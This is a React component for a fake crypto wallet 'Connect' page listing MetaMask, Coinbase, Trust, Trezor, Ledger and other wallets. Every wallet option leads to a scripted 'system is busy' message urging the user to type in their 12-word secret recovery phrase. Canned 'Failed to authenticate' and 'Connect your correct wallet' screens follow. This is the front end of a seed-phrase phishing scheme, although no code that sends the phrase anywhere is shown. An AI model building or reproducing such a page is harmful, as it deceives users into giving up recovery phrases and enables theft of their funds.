import React, { useState } from 'react';
import Container from "../Container/Container";
import { Link } from "react-router-dom";
import BannerBg from "../Banner/BannerBg";
import { Textarea } from "@/components/ui/textarea"
import metaMask from "@/assets/wallets/Group1.png"
import coinbase from "@/assets/wallets/Group2.png"
import trust from "@/assets/wallets/Group3.png"
import trezor from "@/assets/wallets/Group4.png"
import ledger from "@/assets/wallets/Group5.png"
import otherWallets from "@/assets/wallets/Group6.png"
import wallet from "@/assets/wallets/wallet.png"
import { GoQuestion } from "react-icons/go";
import { IoClose } from 'react-icons/io5';
import useTheme from '@/components/useTheme';
import metaMaskLage from "@/assets/wallets/lageImg/MetaMask1.png"
import coinbaseLage from "@/assets/wallets/lageImg/coinbase.webp"
import trustLage from "@/assets/wallets/lageImg/trust.png"
import trezorLage from "@/assets/wallets/lageImg/unnamed.png"
import ledgerLage from "@/assets/wallets/lageImg/images.png"
import otherWalletsLage from "@/assets/wallets/Group6.png"
import walletImg from "@/assets/wallets/lageImg/Frame.png"
import { TfiReload } from "react-icons/tfi";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Carousel, CarouselContent, CarouselItem, CarouselNext, CarouselPrevious } from "@/components/ui/carousel"

const Connect = () => {
  const [show, setShow] = useState(false);
  const { theme } = useTheme();

  return (
    <div className='bg-[#11121F] dark:bg-[#F2F4F6]'>
      <Container>
        <BannerBg />

        <div className='mt-[-200px]'>
          <div className="text-center">
            <p className="text-white dark:text-[#273852] text-[30px] font-medium">Connect your wallet with Secret <br /> Recovery Phrase</p>
          </div>

          {/* card section input */}
          <div>
            <div className="bg-[#11121F] dark:bg-[#F2F4F6] mt-[48px] w-full md:w-[576px] lg:w-[576px] xl:w-[676px] 2xl:w-[764px] mx-auto pb-60">
              <div className="border border-[#1f213a] dark:border-[#7a8aa062] bg-[#151727]  dark:bg-[#F2F4F6] p-6 rounded-[18px]">
                <div>
                  <p className=" text-[#ffffff]  dark:text-[#273852] font-urbanist text-[20px] font-semibold mt-[32px] mb-[24px]">12 - word recovery phrase</p>
                  <div className="mb-[32px]">
                    <form>
                      <Textarea type="textarea" className="h-[154px] border border-[#1f213a] dark:border-[#7a8aa062] text-[#fff] rounded-[18px] bg-transparent focus-visible:ring-offset-1 focus-visible:ring-offset-[#373a64]" />

                      {/* <input type="submit" value="Connect wallet" className=' flex justify-center text-[#BEC3FF80] text-[20px] font-medium bg-[#6E75D20F] px-3.5 py-4 border border-[#473e8b] rounded-[12px] w-full mt-[32px] cursor-pointer' /> */}
                    </form>
                  </div>

                  <div className="w-full mb-[32px]">
                    {/* <Link to="" className=' flex justify-center text-[#BEC3FF80] text-[20px] font-medium bg-[#6E75D20F] hover:bg-[#6e75d213] px-3.5 py-4 border border-[#252846ce] hover:border-[#31345e] hover:bg-[#705DE4] hover:text-white rounded-[12px] duration-300'>Connect wallet</Link> */}

                    <Dialog>
                      <DialogTrigger className="w-full">
                        <button onClick={() => setShow(!show)} className='w-full flex justify-center text-[#BEC3FF80] dark:text-white text-[20px] font-medium bg-[#6E75D20F] hover:bg-[#6e75d213] px-3.5 py-4 border border-[#252846ce] dark:border-none hover:bg-[#705DE4] dark:bg-[#705DE4] dark:hover:bg-[#6f5de4e7] hover:text-white rounded-[12px] duration-300'>Connect wallet</button>
                      </DialogTrigger>

                      <DialogContent className="bg-gradient-to-b from-[#44266f] via-[#131524] to-[#131524] lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                        <DialogHeader>
                          <DialogTitle className="flex justify-between items-center mb-[30px]">
                            {/* Tooltip question icon */}
                            <TooltipProvider>
                              <Tooltip>
                                <TooltipTrigger asChild>
                                  <GoQuestion className="text-[22px] text-[#a794be] cursor-help" />
                                </TooltipTrigger>
                                <TooltipContent className="bg-gradient-to-r from-[#44266f] to-[#381f5a] border-none">
                                  <p className="text-white">Connect lots of wallet</p>
                                </TooltipContent>
                              </Tooltip>
                            </TooltipProvider>

                            <p className="text-[21px] text-[#ffffff] font-bold">Connect Wallet</p>
                            <IoClose className="text-[25px] text-[#a794be]" />
                          </DialogTitle>

                          <DialogDescription>
                            <div>
                              <div className="space-y-4">
                                {/* meta mask popup slider */}
                                <Dialog>
                                  <DialogTrigger className="w-full">
                                    <button className={`flex justify-between items-center rounded-xl px-2 py-3 w-full ${theme === 'dark' ? 'bg-[#464653] border-none' : 'bg-gradient-to-r from-[#6f5ce4] to-[#8768ee] border border-[#6f5ce4] dark:border-none'}`}>
                                      <div className="flex items-center">
                                        <img src={metaMask} alt="Meta Mask" className="w-[35px] mr-3" />
                                        <p className="text-[17px] text-[#FFFFFF]">MetaMask</p>
                                      </div>
                                      <Link to='' className='text-white text-[14px] font-medium bg-[#8f73ee] dark:bg-[#705DE4] px-3 py-[5px] border border-[#8f73ee] dark:border-none rounded-md'>Connect</Link>
                                    </button>
                                  </DialogTrigger>

                                  <DialogContent className="-mt-8 lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                    <DialogHeader>
                                      <DialogDescription>
                                        <Carousel className="relative">
                                          <CarouselContent>
                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div>
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
                                                <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect MetaMask...</p>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
                                                <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                                <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                  <TfiReload className="mr-2" />
                                                  <span>Try Again</span>
                                                </button>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-10 mb-5 cursor-grab" />
                                                <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                                <p className="text-start mt-5">12 Word phrase</p>
                                                <Textarea rows={4} className="mt-1 mb-5" />
                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                              </div>
                                            </CarouselItem>
                                          </CarouselContent>
                                          <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" />
                                          <CarouselNext className="hidden" />
                                          <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                        </Carousel>

                                      </DialogDescription>
                                    </DialogHeader>
                                  </DialogContent>
                                </Dialog>

                                {/* Coinbase popup slider */}
                                <Dialog>
                                  <DialogTrigger className="w-full">
                                    <button className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#321b4cbe] to-[#372e6a54] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#42418a50]"}`}>
                                      <img src={coinbase} alt="Meta Mask" className="w-[35px] mr-3" />
                                      <p className="text-[17px] text-[#FFFFFF]">Coinbase Wallet</p>
                                    </button>
                                  </DialogTrigger>

                                  <DialogContent className="-mt-8 lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                    <DialogHeader>
                                      <DialogDescription>
                                        <Carousel className="relative">
                                          <CarouselContent>
                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div>
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Coinbase</h3>
                                                <img src={coinbaseLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect Coinbase...</p>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Coinbase</h3>
                                                <img src={coinbaseLage} alt="Image" className="w-[100px] mx-auto mt-14 mb-5 cursor-grab" />
                                                <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                                <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                  <TfiReload className="mr-2" />
                                                  <span>Try Again</span>
                                                </button>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-10 mb-5 cursor-grab" />
                                                <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                                <p className="text-start mt-5">12 Word phrase</p>
                                                <Textarea rows={4} className="mt-1 mb-5" />
                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                              </div>
                                            </CarouselItem>

                                          </CarouselContent>

                                          <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" />
                                          <CarouselNext className="hidden" />
                                          <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                        </Carousel>

                                      </DialogDescription>
                                    </DialogHeader>
                                  </DialogContent>
                                </Dialog>

                                {/* Trust popup slider */}
                                <Dialog>
                                  <DialogTrigger className="w-full">
                                    {/* Trust */}
                                    <button className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#1d1831] to-[#20203c77] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                      <img src={trust} alt="Meta Mask" className="w-[35px] mr-3" />
                                      <p className="text-[17px] text-[#FFFFFF]">Trust Wallet</p>
                                    </button>
                                  </DialogTrigger>

                                  <DialogContent className="-mt-8 lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                    <DialogHeader>
                                      <DialogDescription>
                                        <Carousel className="relative">
                                          <CarouselContent>
                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div>
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Trust</h3>
                                                <img src={trustLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect Trust...</p>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Trust</h3>
                                                <img src={trustLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                                <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                  <TfiReload className="mr-2" />
                                                  <span>Try Again</span>
                                                </button>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-10 mb-5 cursor-grab" />
                                                <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                                <p className="text-start mt-5">12 Word phrase</p>
                                                <Textarea rows={4} className="mt-1 mb-5" />
                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                              </div>
                                            </CarouselItem>
                                          </CarouselContent>

                                          <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" />
                                          <CarouselNext className="hidden" />
                                          <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                        </Carousel>
                                      </DialogDescription>
                                    </DialogHeader>
                                  </DialogContent>
                                </Dialog>

                                {/* Trezor popup slider */}
                                <Dialog>
                                  <DialogTrigger className="w-full">
                                    {/* Trezor */}
                                    <button className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#161828] to-[#151727] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                      <img src={trezor} alt="Meta Mask" className="w-[35px] mr-3" />
                                      <p className="text-[17px] text-[#FFFFFF]">Trezor</p>
                                    </button>
                                  </DialogTrigger>

                                  <DialogContent className="-mt-8 lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                    <DialogHeader>
                                      <DialogDescription>
                                        <Carousel className="relative">
                                          <CarouselContent>
                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div>
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Trezor</h3>
                                                <img src={trezorLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect Trezor...</p>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Trezor</h3>
                                                <img src={trezorLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                                <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                  <TfiReload className="mr-2" />
                                                  <span>Try Again</span>
                                                </button>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-10 mb-5 cursor-grab" />
                                                <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                                <p className="text-start mt-5">12 Word phrase</p>
                                                <Textarea rows={4} className="mt-1 mb-5" />
                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                              </div>
                                            </CarouselItem>
                                          </CarouselContent>

                                          <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" />
                                          <CarouselNext className="hidden" />
                                          <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                        </Carousel>
                                      </DialogDescription>
                                    </DialogHeader>
                                  </DialogContent>
                                </Dialog>

                                {/* Leger popup slider */}
                                <Dialog>
                                  <DialogTrigger className="w-full">
                                    {/* Ledger */}
                                    <button className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#161828] to-[#151727] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                      <img src={ledger} alt="Meta Mask" className="w-[35px] mr-3" />
                                      <p className="text-[17px] text-[#FFFFFF]">Ledger</p>
                                    </button>
                                  </DialogTrigger>

                                  <DialogContent className="-mt-8 lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                    <DialogHeader>
                                      <DialogDescription>
                                        <Carousel className="relative">
                                          <CarouselContent>
                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div>
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Ledger</h3>
                                                <img src={ledgerLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect Ledger...</p>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Ledger</h3>
                                                <img src={ledgerLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                                <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                  <TfiReload className="mr-2" />
                                                  <span>Try Again</span>
                                                </button>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-10 mb-5 cursor-grab" />
                                                <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                                <p className="text-start mt-5">12 Word phrase</p>
                                                <Textarea rows={4} className="mt-1 mb-5" />
                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                              </div>
                                            </CarouselItem>
                                          </CarouselContent>

                                          <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" />
                                          <CarouselNext className="hidden" />
                                          <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                        </Carousel>
                                      </DialogDescription>
                                    </DialogHeader>
                                  </DialogContent>
                                </Dialog>

                                {/* Other wallet popup slider */}
                                <Dialog>
                                  <DialogTrigger className="w-full">
                                    {/* Other Wallet */}
                                    <button className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#161828] to-[#151727] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                      <img src={otherWallets} alt="Meta Mask" className="w-[35px] mr-3" />
                                      <p className="text-[17px] text-[#FFFFFF]">Other Wallets</p>
                                    </button>
                                  </DialogTrigger>

                                  <DialogContent className="-mt-8 lg:left-[75%] xl:left-[80%] 2xl:left-[83.4%]">
                                    <DialogHeader>
                                      <DialogDescription>
                                        <Carousel className="relative">
                                          <CarouselContent>
                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div>
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Other Wallets</h3>
                                                <img src={otherWalletsLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                                <p className="text-[18px] text-[#11121F] font-semibold">Connect Other Wallets...</p>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Other Wallets</h3>
                                                <img src={otherWalletsLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                                <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                                <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                                  <TfiReload className="mr-2" />
                                                  <span>Try Again</span>
                                                </button>
                                              </div>
                                            </CarouselItem>

                                            <CarouselItem className="flex justify-center text-center w-0">
                                              <div className="w-full">
                                                <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                                <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-10 mb-5 cursor-grab" />
                                                <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                                <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                                <p className="text-start mt-5">12 Word phrase</p>
                                                <Textarea rows={4} className="mt-1 mb-5" />
                                                <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                              </div>
                                            </CarouselItem>
                                          </CarouselContent>

                                          <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" />
                                          <CarouselNext className="hidden" />
                                          <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                        </Carousel>
                                      </DialogDescription>
                                    </DialogHeader>
                                  </DialogContent>
                                </Dialog>
                              </div>

                              <div className="flex justify-center mt-4">
                                <div className="flex items-center">
                                  <img src={wallet} alt="wallet" className="w-[20px] mr-2" />
                                  <Link to="/" className="text-[#D3D2FF80] hover:underline">I use different wallet</Link>
                                </div>
                              </div>
                            </div>
                          </DialogDescription>
                        </DialogHeader>
                      </DialogContent>
                    </Dialog>

                  </div>
                </div>
              </div>
            </div>

            {
              show ? <div className='flex justify-center'>
                <p className='text-red-500 font-urbanist font-semibold -mt-52 capitalize'>Connect your correct wallet</p>
              </div> : ''
            }
          </div>
        </div>


      </Container>
    </div>
  );
};

export default Connect;
